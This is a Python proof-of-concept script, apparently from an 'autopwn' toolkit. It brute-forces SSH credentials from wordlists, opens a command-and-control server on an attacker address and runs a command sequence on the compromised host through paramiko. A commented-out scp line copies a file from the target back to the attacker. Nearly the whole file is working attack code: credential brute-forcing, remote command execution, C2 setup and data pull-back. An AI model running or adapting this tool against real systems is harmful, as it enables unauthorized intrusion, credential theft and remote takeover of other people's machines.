#!/bin/python3
from pathlib import Path
from subprocess import run, PIPE
import paramiko
from sys import argv
from post.postexploit import openCtrlSrv
from autopwn import flushProcesses
import sequences as s
from logs import LOG

LOGFILE = open("./LOGS","r+")

def processList(inp="") -> list:
    """Function that process lists txts in lists."""
    LOG(f"Processing wordlist for input : {inp}",LOGFILE)
    with open(inp, "r+") as f:
        tmp = f.readlines()
    lst = []
    for k in tmp:
        lst.append(k.strip())
    return lst


def getSshCredsAndConn(ulist="", plist="", domain="") -> tuple[(str, str)]:
    """Slow bruteforce of ssh credentials."""
    LOG(f"Bruteforcing user/password for {domain}", LOGFILE)
    uname = processList(ulist)
    passwd = processList(plist)
    retUsr = "x"
    retPass = "x"
    for user in uname:
        for password in passwd:
            command = f"echo 'exit' | sshpass -p {password} ssh {user}@{domain}"
            print(f"Trying to execute: '{command[15:]}' ")
            proc = run(command, shell=True, stderr=PIPE, stdout=PIPE)  # Output is piped
            # print(f"$? = {proc.returncode}") -- Debug
            if proc.returncode == 0 or proc.returncode == 1:
                print(f"SSH password for {user} in {domain} is {password}")
                retUsr = user
                retPass = password
                break
        if proc.returncode == 0 or proc.returncode == 1:
            break
    return (retUsr, retPass)


def autoSshPawn(usr, password, host, sequence) -> int:
    """ Take ssh credentials to connect and remotely runs\\
        instructions on target machine. """
    LOG(f"Pawning host {host} with SSH creds {usr}:{password}", LOGFILE)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        LOG(f"Connecting to {host} with SSH creds {usr}:{password}", LOGFILE)
        ssh.connect(host, username=usr, password=password)
    except paramiko.AuthenticationException:
        LOG(f"Connection to SSH client failed.", LOGFILE,"err")
        print(f"Can't connect to SSH client.")
        return -1

    print(f"Pawning machine through SSH ...")
    for instruction in sequence:
        print(f"[Command] {instruction}")
        LOG(f" Launched {instruction} over SSH against {host}", LOGFILE)
        try:
            stdin, stdout, stderr = ssh.exec_command(
                instruction, timeout=10
            )
            print(f"[Output] " + stdout.read().decode("utf8"))
        except TimeoutError:
            LOG(f"Timeout error for {instruction}. ", LOGFILE,"crit")
            continue

    return 0


if __name__ == "__main__":

    flushProcesses()

    print("*** POC : SSH Pawn ***")

    attackAddr = "192.168.1.86"
    attacker = "test"

    if len(argv) > 1:
        target = argv[1]
    else:
        target = "192.168.1.188"

    usr, pwd = getSshCredsAndConn(
        ulist="./init/userlist", plist="./init/passlist", domain=target
    )

    if usr and pwd:
        print(f"Credentials user = {usr} | password = {pwd}")
        proc, port = openCtrlSrv(bindaddr=attackAddr)
        srv = f"{attackAddr}:{port}"
        print(f"Command and Control server @{srv} !")
        autoSshPawn(usr, pwd, target, s.getsequence(7, srv))
        # print(f"[Local command] scp {usr}@{target}:/home/vargant/linout .")
        # proc = run(
        #     f"scp {usr}@{target}:/home/vagrant/linout {attacker}@{attackAddr}:.",
        #     shell=True,
        # )
        print(f"*** End of POC ***")
        LOGFILE.close()
        exit(0)
